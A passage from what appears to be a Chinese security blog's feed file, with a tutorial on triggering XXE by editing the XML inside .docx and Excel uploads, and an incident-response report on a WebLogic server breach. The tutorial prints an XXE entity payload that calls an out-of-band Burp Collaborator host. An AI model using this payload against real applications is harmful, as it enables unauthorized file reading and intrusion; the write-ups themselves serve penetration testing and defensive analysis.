<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test$ ls</span><br><span class="line">test.docx</span><br><span class="line">test$ mkdir unzipped</span><br><span class="line">test$ unzip ./test.docx -d ./unzipped/</span><br><span class="line">Archive:  ./test.docx</span><br><span class="line">  inflating: ./unzipped/word/numbering.xml</span><br><span class="line">  inflating: ./unzipped/word/settings.xml</span><br><span class="line">  inflating: ./unzipped/word/fontTable.xml</span><br><span class="line">  inflating: ./unzipped/word/styles.xml</span><br><span class="line">  inflating: ./unzipped/word/document.xml</span><br><span class="line">  inflating: ./unzipped/word/_rels/document.xml.rels</span><br><span class="line">  inflating: ./unzipped/_rels/.rels</span><br><span class="line">  inflating: ./unzipped/word/theme/theme1.xml</span><br><span class="line">  inflating: ./unzipped/[Content_Types].xml</span><br></pre></td></tr></table></figure>

<p>在您喜欢的文本编辑器 (vim) 中打开 <code>./unzipped/word/document.xml</code> 并编辑 <strong>XML 以包含您喜欢的 XXE 有效负载</strong>。我尝试的第一件事往往是 HTTP 请求，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY test SYSTEM &quot;http://[ID].burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p>这些行应该像这样插入到两个根 XML 对象之间，当然您需要将 URL 替换为可以监视请求的 URL：</p>
<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png" alt="Those lines should be inserted in between the two root XML objects, like thi"></p>
<p>剩下的就是<strong>压缩文件以创建恶意的 poc.docx 文件</strong>。从我们之前创建的“解压缩”目录中，运行以下命令：</p>
<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png" alt="From the &quot;unzipped&quot; directory that we created earlier, run the following:"></p>
<p>现在将文件上传到易受攻击的 Web 应用程序，并在 Burp Collaborator 日志监控是否收到请求。</p>
<h2 id="0x02-通过上传Excel对网站进行XXE攻击"><a href="#0x02-通过上传Excel对网站进行XXE攻击" class="headerlink" title="0x02-通过上传Excel对网站进行XXE攻击"></a>0x02-通过上传Excel对网站进行XXE攻击</h2><h3 id="0x02-1-确认XXE"><a href="#0x02-1-确认XXE" class="headerlink" title="0x02-1 确认XXE"></a>0x02-1 确认XXE</h3><p>某次对项目网站进行测试，发现应用系统中提供多个上传接口，允许用户上传 Excel 文件并在后端对 Excel 文件进行数据解析导入。<br>根据 <code>0x01-前言</code> 提及的方法，对 Excel 解压，修改文件XML内容。第一次修改的文件为 <code>[Content_Types].xml</code> ，修改后重压缩文件为 xsls 文件并上传，测试后现XXE攻击失败。<br>后续将 <code>xl/workbook.xml</code>、<code>xl/worksheets/sheet1.xml</code>、<code>xl/theme/theme1.xml</code>的内容均作修改，插入 XXE PayLoad。重新上传修改后的 xsls 文件，成功触发 XXE漏洞。</p>
<h3 id="0x02-2-读取文件"><a href="#0x02-2-读取文件" class="headerlink" title="0x02-2 读取文件"></a>0x02-2 读取文件</h3><p>还没来得及测试，对方已修复漏洞，bingo！！！</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>XXE</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次服务器应急响应</title>
    <url>/2022/03/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>2021年5月26日早，突然收到同事通知，云平台某服务器A出现异常。表像为：A对其他主机进行漏洞扫描攻击。</p>
<h2 id="0x02-事件处置"><a href="#0x02-事件处置" class="headerlink" title="0x02 事件处置"></a>0x02 事件处置</h2><h3 id="获取基本信息"><a href="#获取基本信息" class="headerlink" title="获取基本信息"></a>获取基本信息</h3><p><strong>访谈相关人员：</strong></p>
<ol>
<li>服务器IP&#x2F;域名地址：<code>***.***.118.103</code>，<code>****.*****.***.cn</code>；</li>
<li>服务器名称：培训考勤签到系统；</li>
<li>上线时间：2021年1月；</li>
<li>是否对互联网服务：是；</li>
<li>中间件：weblogic 12.1，前段时间排查过程发现存在漏洞，由于运维无法提供补丁，采取禁用 T3 及 IIOP 协议缓解部分漏洞，继续对外服务；</li>
<li>何时出现异常现场：2021年5月26日；</li>
<li>异常情况：对其他服务器进行扫描攻击；</li>
<li>其他信息：采用 HTTPS 方式加密传输；内部负载均衡地址：<code>***.**.26.191</code>，端口：<code>443</code>；外部负载均衡地址：<code>***.**.26.10</code>，端口：<code>443</code>；服务器上线过程中存在不规范，安全人员不知情，服务器未加入 WAF 等安全设备进行保护 。</li>
</ol>
<h3 id="恶意文件查杀"><a href="#恶意文件查杀" class="headerlink" title="恶意文件查杀"></a>恶意文件查杀</h3><p>对服务器A进行恶意文件查杀，发现服务器是裸奔，临时下载火绒合D盾对服务器进行恶意文件识别（不建议使用火绒），火绒识别4个恶意文件，D盾识别6个恶意文件，文件创建事件均为5月25日。</p>
<h3 id="流量分析平台记录分析"><a href="#流量分析平台记录分析" class="headerlink" title="流量分析平台记录分析"></a>流量分析平台记录分析</h3><p>翻查NGSOC关于 <code>***.***.118.103</code> 的WEB流量记录，只有零星几条，无法获取有效信息。</p>
<p>翻查 access 日志尝试获取有用信息的时候，发现日志中有weblogic 的 CVE-2020-14882 攻击记录，payload 作用为反弹shell，根据 payload 的上的反弹地址发现一个攻击者IP，尝试在NGSOC上搜索该源 IP 地址，发现记录，其中该记录目的地址为： <code>***.**.26.10</code> 。访问管理员后发现互联网地址与 <code>***.***.118.103</code> 通讯，需经过内外负载均衡，外部负载均衡地址为： <code>***.**.26.10</code> 。</p>
<p>查询关于外部负载均衡地址（ <code>***.**.26.10</code> ）的 WEB 流量记录，依然只有零星几条记录，陷入死局。过了一段时间，原来是忽略了服务器采用 HTTPS 加密协议传输，且未将证书私钥导入 <strong>NDS</strong> 内，所以无法通过 <code>FLOW_WEB</code> 表查询 WEB 流量记录，只能通过 <code>FLOW_SSL</code> 表查询 SS L加密协商流量，然而 SSL 加密流量的内容完全看不到，只能查询该段时间哪些 IP 访问过。</p>
<p>通过 NGSOC 平台搜索语法筛选5月21-26日访问该应用系统的互联网地址，发现从25日凌晨开始有19个异常高频的访问记录，大多数为来自中国四川。</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>IP</th>
<th>IP的物理位置</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>39.144.137.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>2</td>
<td>39.144.137.**</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>3</td>
<td>139.207.149.***</td>
<td>四川省</td>
</tr>
<tr>
<td>4</td>
<td>81.69.33.***</td>
<td>上海市</td>
</tr>
<tr>
<td>5</td>
<td>39.144.137.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>6</td>
<td>171.210.45.***</td>
<td>四川省</td>
</tr>
<tr>
<td>7</td>
<td>116.169.1.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>8</td>
<td>125.34.74.**</td>
<td>北京市</td>
</tr>
<tr>
<td>9</td>
<td>171.88.165.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>10</td>
<td>171.221.43.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>11</td>
<td>114.253.56.***</td>
<td>北京市</td>
</tr>
<tr>
<td>12</td>
<td>117.136.32.***</td>
<td>广州市</td>
</tr>
<tr>
<td>13</td>
<td>106.13.30.***</td>
<td>广州市</td>
</tr>
<tr>
<td>14</td>
<td>165.227.136.***</td>
<td>德国 黑森州 美因河畔法兰克福</td>
</tr>
<tr>
<td>15</td>
<td>222.212.129.***</td>
<td>四川省 成都市</td>
</tr>
<tr>
<td>16</td>
<td>45.146.164.***</td>
<td>俄罗斯 莫斯科州 莫斯科</td>
</tr>
<tr>
<td>17</td>
<td>45.147.197.***</td>
<td>荷兰 海尔德兰省 杜廷赫姆</td>
</tr>
<tr>
<td>18</td>
<td>115.171.244.**</td>
<td>北京市</td>
</tr>
<tr>
<td>19</td>
<td>198.20.69.**</td>
<td>美国 亚利桑那州 菲尼克斯</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p>结合恶意文件创建时间及 NGSOC流 量记录信息，判断攻击者开展攻击时间为2021年5月25日凌晨0时至2021年5月26日上午10点30分（服务器断网时间点）。为更全面发现服务器A存在的恶意文件，将2021年5月25日-26日新增的文件全部备份并开展人工分析。通过人工分析，从161个文件中发现27个恶意文件（含D盾及火绒识别出来的恶意文件），恶意文件类型包括：webshell(冰蝎木马)、流量代理文件、MS17-010 扫描工具、Windows密码提取工具（mimikatz.exe、procdump64.exe）、CS木马、主机扫描工具等。</p>
<p>分析CS马过程中，发现反连域名及反连IP地址， <code>3ead0dfe.ns2.*****.site</code> 、 <code>3ead0dfe.ns2.*****.site</code> 、 <code>171.***.***.***</code> 。通过whois、搜索引擎结合域名信息查到攻击者QQ号，照片等个人信息。</p>
<blockquote>
<p>PS：自动化分析平台：</p>
</blockquote>
<ol>
<li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
<li><a href="https://www.virustotal.com/">https://www.virustotal.com/</a></li>
<li><a href="https://app.any.run/">https://app.any.run/</a></li>
</ol>
<blockquote>
<p>手动行为分析工具：火绒剑、promon</p>
</blockquote>
<h3 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h3><p>PcLog 查询系统操作，发现5月25日15点00分执行过CS木马“123321.exe” , 执行结果为失败，软件崩溃。此外，其他信息均为登陆记录。<br>RegRipper3.0 查询 Amcache，发现5月25日分别执行过 dns.exe、fscsn64.exe、123321.exe、amd.exe、mimikatz.exe。<br>RegistryExplorer 查询 UserAssist，未发现5月25日的信息。</p>
<h2 id="0x03-分析结果"><a href="#0x03-分析结果" class="headerlink" title="0x03 分析结果"></a>0x03 分析结果</h2><p>access 日志记录信息不全（原因未知，HTTPS协议的关系？），流量记录分析平台的相关内容均是加密状态，无法查看。根据中间件情况（未安装的补丁的weblogic）及恶意文件的存放的路径，推断攻击者通过weblogic反序列化漏洞入侵。</p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>非法入侵</tag>
      </tags>
  </entry>
</search>
